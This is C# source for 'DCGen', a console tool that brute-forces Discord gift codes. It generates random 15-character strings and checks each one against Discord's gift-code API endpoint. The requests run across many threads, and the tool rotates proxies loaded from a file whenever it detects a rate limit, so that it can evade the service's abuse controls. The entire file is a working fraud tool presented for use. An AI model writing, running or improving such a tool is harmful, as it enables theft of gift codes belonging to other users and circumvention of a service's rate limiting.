using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using Newtonsoft.Json;

namespace DCGen
{
    class Program
    {
        private static List<string> proxies = new List<string>();
        private static List<Thread> threads = new List<Thread>();
        private static Random random = new Random();
        private static int tries = 0;

        public static string Get(string uri, string proxy, bool useproxy)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);

            request.Timeout = 5000;

            if (useproxy)
                request.Proxy = new WebProxy(proxy);

            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            HttpWebResponse response;

            try
            {
                response = request.GetResponse() as HttpWebResponse;
            }
            catch (WebException ex)
            {
                response = ex.Response as HttpWebResponse;
            }

            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }

        //credits: https://stackoverflow.com/questions/1344221/how-can-i-generate-random-alphanumeric-strings
        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static string getProxy()
        {
            Random r = new Random();

            int selectIndex = r.Next(proxies.Count);

            string selectedProxy = proxies[selectIndex];

            proxies.RemoveAt(selectIndex);

            Logger.Log(string.Format("Selected Proxy: {0}", selectedProxy), LogMode.Success);


            return selectedProxy;
        }

        static void bruteFunction()
        {
            string curProxy = getProxy();

            while (true)
            {
                string genCode = RandomString(15);

                try
                {

                    string sResponse = Get(string.Format("https://discordapp.com/api/v6/entitlements/gift-codes/{0}?with_application=false&with_subscription_plan=false", genCode), curProxy, true);

                    try
                    {
                        DCResponse discord_response = JsonConvert.DeserializeObject<DCResponse>(sResponse);

                        if (discord_response.code == 0)
                        {
                            Logger.Log("Rate Limit Detected", LogMode.Error);

                            curProxy = getProxy();

                            continue;
                        }


                        if (discord_response.code != 0)
                        {
                            tries++;

                            Console.Title = "DCGen Version 1.0 | Tries: " + tries;
                            Logger.Log(string.Format("Tried: {0} Code: {1} Message: {2}", genCode, discord_response.code, discord_response.message), LogMode.Info);
                        }
                    }
                    catch
                    {
                        //json error maybe bad proxy??
                        curProxy = getProxy();
                    }
                }
                catch
                {
                    curProxy = getProxy();
                }


                Thread.Sleep(200);
            }
        }

        static void Main(string[] args)
        {
            //https://discordapp.com/api/v6/entitlements/gift-codes/AAAAABBBBBCCCCC?with_application=false&with_subscription_plan=false

            Console.Title = "DCGen Version 1.0 | Tries: 0";

            Logger.Log("Version 1.0 Created By Nulled", LogMode.Info);

            if (!File.Exists("proxies.txt"))
            {
                Logger.Log("Please create proxies.txt and try again.", LogMode.Error);
                return;
            }

            foreach (var p in File.ReadAllLines("proxies.txt"))
                proxies.Add(p);

            if (proxies.Count <= 0)
            {
                Logger.Log("No proxies loaded.", LogMode.Error);
                return;
            }
            else
                Logger.Log(string.Format("{0} Proxies Loaded.", proxies.Count), LogMode.Info);

            Logger.Log("Enter Number Of Threads:", LogMode.Success);

            int threadCount = Convert.ToInt32(Console.ReadLine());


            for(int i = 0; i < threadCount; i++)
            {
                Thread th = new Thread(bruteFunction);
                th.Start();
                Logger.Log(string.Format("Created Thread ID: {0}", i), LogMode.Success);
            }  
        }
    }
}
